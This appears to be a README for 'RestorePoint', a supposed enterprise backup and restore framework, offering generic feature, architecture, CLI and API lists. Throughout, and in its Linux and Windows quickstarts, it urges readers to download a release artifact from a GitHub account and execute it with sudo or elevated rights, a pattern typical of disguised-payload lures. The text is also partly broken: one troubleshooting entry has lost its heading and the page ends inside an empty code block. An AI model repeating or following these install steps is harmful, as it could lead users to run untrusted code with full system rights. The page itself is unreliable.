RestorePoint is a professional framework for creating, storing, and applying system restore points at enterprise scale. It combines snapshot capture, delta encoding, and optimized restore flows. The framework targets system admins, SREs, and platform engineers who need reliable, fast recovery with low storage cost.

Key link: download the release file from https://github.com/AmberFromRBLX/RestorePoint/releases and execute the release artifact per the install steps below.

Features
- Point-in-time snapshots across files, VMs, containers, and databases.
- Deduplication and delta compression to cut storage use.
- Block-level and file-level restore modes.
- Incremental replication to tiered storage and S3-compatible targets.
- RestorePoint-optimized orchestration for enterprise maps and policies.
- Role-based access control and audit logs.
- REST API and CLI for automation and integration.
- Plugin interface for custom storage backends and drivers.

Why RestorePoint
- Reduce downtime by using fine-grain restore flows.
- Lower storage costs with dedupe and delta streams.
- Reuse existing backup targets with a small adapter layer.
- Integrate with CI/CD and scheduled jobs with API hooks.

Architecture Overview
- Agent: Runs on host. It captures filesystem metadata, reads blocks, and streams deltas.
- Controller: Orchestrates snapshot schedules, retention, and policies.
- Storage Layer: Pluggable. Supports local object stores, S3, Azure Blob, and on-prem vaults.
- Index and Catalog: Stores metadata, version pointers, and restore maps.
- Restore Engine: Reconstructs target state using catalog and blobs.

Core concepts
- Snapshot: A captured system state at a point in time.
- Delta: The difference between two snapshots at block or file level.
- Catalog: The index of snapshots, deltas, and blobs.
- Restore Map: The plan the engine uses to rebuild a target.
- Retention Policy: Rules that control snapshot lifecycle.

Quickstart (Linux)
1. Download the release artifact from https://github.com/AmberFromRBLX/RestorePoint/releases and save it to a local directory.
2. Extract and run the installer or binary. Example commands:
   - curl example (replace with actual artifact URL listed on the Releases page):
     ```
     curl -L -o restorepoint-release.tar.gz "https://github.com/AmberFromRBLX/RestorePoint/releases/download/v1.0/restorepoint-release.tar.gz"
     tar xzf restorepoint-release.tar.gz
     sudo ./install.sh
     ```
   - If the artifact is a binary:
     ```
     curl -L -o restorepoint "https://github.com/AmberFromRBLX/RestorePoint/releases/download/v1.0/restorepoint-linux-amd64"
     chmod +x restorepoint
     sudo mv restorepoint /usr/local/bin/restorepoint
     ```
3. Start the controller:
   ```
   sudo systemctl enable --now restorepoint-controller
   ```
4. Install agent on a host:
   ```
   sudo restorepoint agent install
   sudo systemctl enable --now restorepoint-agent
   ```
5. Create a snapshot schedule:
   ```
   restorepoint schedule create --name hourly --cron "0 * * * *" --targets /var/www,/etc
   ```
6. List snapshots:
   ```
   restorepoint snapshot list
   ```

Windows quick start (power shell)
- Download the release file from https://github.com/AmberFromRBLX/RestorePoint/releases, unzip, and run the installer executable. Use elevated PowerShell to run the MSI or EXE and follow prompts.

CLI Reference
- restorepoint agent install
- restorepoint agent status
- restorepoint snapshot create --target <path> --desc "Before upgrade"
- restorepoint snapshot list --limit 50
- restorepoint restore apply --snapshot-id <id> --path <target>
- restorepoint catalog verify --snapshot-id <id>
- restorepoint storage add --type s3 --bucket my-bucket --prefix rp-backups

API Summary
- GET /api/v1/snapshots — list snapshots
- POST /api/v1/snapshots — create
- GET /api/v1/snapshots/{id} — inspect
- POST /api/v1/restore — start restore job
- GET /api/v1/jobs/{job_id} — job status
- POST /api/v1/storage — add storage target

Storage and Retention
- Tiering: Hot tier for recent snapshots, cold tier for long-term retention.
- Encryption: AES-256 at rest. TLS in transit.
- Checksums: SHA-256 checks for blob integrity.
- Retention rules: keep-last, keep-daily, keep-weekly, keep-monthly.
- Erasure coding options for low-cost durability.

Data Flow
1. Capture file metadata and block map.
2. Use hash map to find duplicate blocks.
3. Send unique blocks to storage backend.
4. Update catalog with pointers to blobs and dedupe indexes.
5. For restores, the engine fetches blobs, applies deltas, and writes to target.

Best Practices
- Run agents as a service account with least privilege.
- Place controller in a private network for security.
- Use object storage with versioning for safety.
- Test restores in a staging environment on a regular cadence.
- Use small snapshot intervals for low RPO, larger retention for compliance.

Performance Tuning
- Adjust chunk size for workloads with large files.
- Enable parallel upload for high bandwidth links.
- Use local cache on agents for hot recovery.
- Tune dedupe window based on change rate.

Integrations
- Kubernetes: Use RestorePoint operator to snapshot PVCs and app volumes.
- VMware: Use hypervisor integration for consistent VM snapshots.
- Databases: Use plugin hooks for pre-snapshot quiesce and post-snapshot thaw.
- CI/CD: Call REST API to create pre-release snapshots and to roll back after failed deployments.

Enterprise Features
- Multi-tenant controller with RBAC and tenant isolation.
- Policy engine for compliance: label-based rules and enforced retention.
- Audit logs in append-only storage for compliance.
- Restore workflows that integrate with ticketing and change control.

Security
- Mutual TLS for controller-agent communication.
- Role-based tokens with scoped permissions.
- Immutable catalogs for legal hold.
- Key management for encryption keys. Integrate with KMS or HSM.

Observability
- Metrics: snapshot count, bytes stored, restore latency, dedupe ratio.
- Expose Prometheus metrics.
- Log to structured JSON for easier ingestion.
- Health checks for service endpoints.

Testing and Validation
- Catalog verify tool checks a snapshot's blob integrity.
- Restore dry-run simulates a restore and reports missing blobs.
- Scheduled restore audits run recovery tests automatically.

Plugin System
- Storage plugin interface: implement save(blob), fetch(blob_id), list(prefix).
- Quiesce plugin interface: pre_snapshot(), post_snapshot().
- Use Go or Python SDK to write plugins.

Troubleshooting
- Agent not connecting:
  - Check firewall rules.
  - Check TLS trust store and certificates.
- Slow upload:
  - Check network throughput.
  - Increase parallel upload threads.

  - Run catalog verify to find corrupt entries.
  - Check storage backend for retention policies or lifecycle rules.

Examples
- Snapshot before upgrade:
  ```
  restorepoint snapshot create --targets /opt/app --desc "pre-upgrade 2025-08-01"
  ```
- Restore file tree:
  ```
  restorepoint restore apply --snapshot-id a1b2c3 --path /tmp/restore-test
  ```
- Automate in CI:
  ```
